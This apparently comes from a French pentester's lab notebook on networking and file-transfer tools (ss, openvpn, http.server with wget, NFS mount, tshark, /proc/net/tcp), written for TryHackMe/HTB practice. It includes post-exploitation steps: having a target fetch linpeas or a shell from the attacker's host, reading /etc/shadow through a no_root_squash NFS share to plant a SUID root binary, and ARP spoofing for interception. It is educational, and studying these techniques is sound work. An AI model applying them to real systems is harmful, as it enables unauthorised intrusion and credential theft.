# 05 — RÉSEAU & TRANSFERT DE FICHIERS

> Casier des outils qui diagnostiquent le réseau, tunnelent vers la cible, et déplacent des fichiers.
> Outils : `ss` · `ip a` · `ping` + `arp` · `openvpn` · `http.server` + `wget` · `mount` (NFS) · `tshark` / Wireshark · `/proc/net/tcp`

---

## ss

**Rôle** — Le recensement des portes ouvertes **vues de l'intérieur** : quels programmes écoutent sur quels ports (à croiser avec le `nmap` externe — l'écart = une découverte).

**Invocation type**
```bash
sudo ss -tlnp     # ports TCP en écoute + le programme derrière
```

**Flags décodés** — `-t` = **T**CP · `-l` = **l**istening · `-n` = **n**umeric (pas de DNS) · `-p` = **p**rocess (quel programme tient la porte).

**Lecture (grille 3 questions)**
Pour chaque ligne : **quelle porte** / **exposée à tous** (`0.0.0.0`/`[::]` = toutes interfaces) **ou locale** (`127.0.0.1`/`[::1]` = loopback, injoignable du dehors) / **légitime ?**
- Exposé = nginx `80`+`443` (métier), sshd `22` (nécessaire, à durcir).
- Local = redis `6379` + postgres `5432` en `127.0.0.1` = le **piège DB-exposée évité**.

**Règle d'or** — *N'expose QUE ce qui DOIT être atteint de l'extérieur ; tout le reste reste en loopback.* Le bind est **une ligne de config** (`postgresql.conf` → `listen_addresses`, `redis.conf` → `bind`).

---

## ip a

**Rôle** — Voir **mes** interfaces et adresses IP. Sert surtout à trouver **mon IP de retour** (LHOST / `$ip` d'un reverse shell).

**Invocation type**
```bash
ip a                 # toutes les interfaces
ip a show tun0       # juste l'interface VPN (mon IP THM/HTB)
ip addr show tun0    # idem (forme longue)
```

**Exemple vécu** — « vérifier, pas deviner » : supposé `tun0` en `10.x`, la commande a tranché → `192.168.x.x`. La commande a la vérité, pas l'intuition.

**Piège** — Le LHOST auto de Metasploit peut être `10.0.3.15` (NAT VirtualBox, injoignable). Toujours confirmer avec `ip a show tun0` (THM/HTB) ou l'IP host-only (lab maison).

---

## ping + arp

**Rôle** — Diagnostic de connectivité de base. `ping` = « la machine est-elle vivante ? » (ICMP, couche 3). `arp -n` = « qui répond au niveau 2 ? » (table ARP, couche liaison).

**Invocation type**
```bash
ping <ip>        # la cible répond-elle ?
arp -n           # table ARP (adresses MAC connues)
```

**Exemple vécu (debug home lab)** — la cible « glissait » de `.10` (statique) vers `.101` (DHCP). Diagnostic par 3 signaux : `renewal in 254 seconds` = signature DHCP · `arp -n` → `(incomplete)` = adresse fantôme, personne ne répond · ping inverse OK = réseau sain. Cause = `dhclient` zombie → `sudo pkill dhclient` + `sudo reboot`.

**Pièges & leçons**
- **`(incomplete)` dans `arp`** = ARP sans réponse (couche 2) ≠ un simple timeout.
- **`ps aux | grep dhclient` se voit lui-même** (le mirage) → écrire `grep [d]hclient` pour l'éviter.

---

## openvpn

**Rôle** — Monter le **tunnel** vers le réseau d'un lab distant (TryHackMe/HTB) → crée l'interface `tun0` par laquelle la cible peut te rappeler.

**Invocation type**
```bash
sudo openvpn <fichier>.ovpn                          # tunnel simple
sudo openvpn --config <fichier>.ovpn --disable-dco   # en VM (fix ping-restart)
```

**Vérifier la connexion** — chercher `Initialization Sequence Completed` dans le flot, puis dans un 2ᵉ terminal `ip a show tun0` → une IP = connecté.

**Pièges & leçons**
- **Ligne de succès « invisible »** : `Initialization Sequence Completed` est noyée dans les logs verbeux → lire les logs, ne pas paniquer.
- **`Inactivity timeout (--ping-restart)`** (coupe toutes les ~4 min) = DCO (module noyau) instable en VM → `--disable-dco`.
- **`--config` devient OBLIGATOIRE** dès qu'on ajoute une option (sinon `You must define TUN/TAP device (--dev)`).

---

## Transfert : python3 -m http.server + wget

**Rôle** — Le duo de transfert post-exploit : Kali devient serveur web (`http.server`), la cible télécharge (`wget`). Sert à déposer linpeas, un exploit, un shell.

**Invocation type**
```bash
# Côté Kali (dans le dossier du fichier) :
cd /usr/share/peass/linpeas/
python3 -m http.server 8000
# Côté cible :
cd /tmp && wget http://<mon_ip>:8000/linpeas.sh
```

**À savoir**
- `-m` = exécute un **module** de la lib standard Python (« piles incluses », rien à installer) ≠ `python3 script.py`.
- **Serveur passif / client actif** : `http.server` attend, `wget` frappe → la danse `GET /linpeas.sh` → `200` = colis livré (preuve visible des deux côtés).

**Pièges & leçons**
- **Port privilégié** : `http.server 80` = `Permission denied` (ports <1024 = root only) → port HAUT `8000`.
- **Piège vitrine** : `http.server` sert **le dossier depuis lequel il est lancé** → sinon `404`. Lancer DEPUIS le dossier du fichier.
- **`http://` ≠ `https://`** : `http.server` = HTTP nu, sans certificat → un `wget https://` échouerait à la poignée TLS.
- **`/tmp`** = souvent world-writable → bon point de chute côté cible.

---

## mount (NFS)

**Rôle** — Brancher un partage réseau distant sur un dossier local vide → ses fichiers apparaissent chez toi. (Après avoir listé les exports au `showmount`, casier 01.)

**Invocation type**
```bash
mkdir /mnt/partage
sudo mount -t nfs <ip>:/ /mnt/partage    # type / source / destination
ls /mnt/partage                          # le disque de la cible, chez toi
```

**Décodé** — 3 ingrédients : `-t nfs` = **t**ype · `<ip>:/` = **source** (le partage distant) · `/mnt/partage` = **destination** (point de montage local).

**Exemple vécu** — `showmount -e` → `/ *` → `mount -t nfs <ip>:/ /mnt/partage` → lecture de `/etc/shadow` à travers le partage = confirme `no_root_squash` → déploiement d'un binaire C SUID root → root.

**Pièges & leçons**
- **`sudo` obligatoire** : `no_root_squash` ne joue que si c'est root@Kali qui monte.
- **`/tmp` vidé au reboot** → utiliser `/mnt` (maison persistante des montages), pas `/tmp/partage`.
- Le message `Created symlink rpc-statd` n'est **pas** une erreur.
- **Accès FICHIER ≠ commander la machine** : le NFS est le MOYEN, pas le but root (`whoami` reste la vérité).

---

## tshark / Wireshark

**Rôle** — Analyseur de paquets : capturer et lire le trafic réseau trame par trame. Wireshark = l'interface graphique ; `tshark` = le même moteur en ligne de commande. Le renifleur bas niveau dessous = Npcap (Windows).

**Invocation type**
```bash
tshark -D                        # lister les interfaces capturables
tshark -i <n> -Y "icmp.type==8"  # capturer, filtre d'AFFICHAGE (ping aller)
```

**À savoir**
- **Filtre d'affichage** (`-Y`) = décide ce qu'on **montre** parmi ce qui est déjà capturé (appliqué APRÈS, changeable à volonté).
- **GUI** : `File > Open` un `.pcapng` → cliquer un paquet → dérouler les couches à la souris.

**Pièges & leçons**
- **Le duo MITM** : renifler ne montre que **son propre** trafic. Pour voir celui des autres sur un switch → d'abord **ARP spoof** (fais venir le trafic) PUIS Wireshark (lis-le). L'un sans l'autre = inutile.
- **Checksum `0000`** sur ses paquets sortants = checksum offloading (la carte le calcule après la capture) → ne pas paniquer.

---

## `/proc/net/tcp` — lister les sockets quand `ss`/`netstat` manquent

**Rôle** — Sur une box nue (ni `ss` ni `netstat`), le **noyau lui-même** tient la liste des sockets : « tout est fichier ». Je la lis directement.

**Invocation type**
```bash
cat /proc/net/tcp            # IPv4 (et /proc/net/tcp6 pour l'IPv6)
# colonnes utiles : local_address = IP:PORT... EN HEXADÉCIMAL
```

**À savoir**
- **Ports en HEXA** → convertir : `0x69ED` = **27117**. (`local_address` = `IPhexa:PORThexa`, `st` = état, `0A` = LISTEN.)
- Alternative quand le port est connu : le `/dev/tcp` de bash pour tester un port ; ou lire les logs/config de l'appli (ils crachent souvent le port).

**Exemple vécu** — **Unified** : pas de `ss`/`netstat` → port MongoDB `27117` débusqué via `/proc/net/tcp` **et** confirmé dans `mongod.log` (`port=27117`).

**Pièges & leçons**
- **Réflexe post-shell** : « qu'est-ce qui écoute **en local**, invisible au nmap externe ? » Un service sur `127.0.0.1` = souvent la voie du privesc.
- Ne pas oublier `tcp6` (un service peut n'écouter qu'en IPv6).
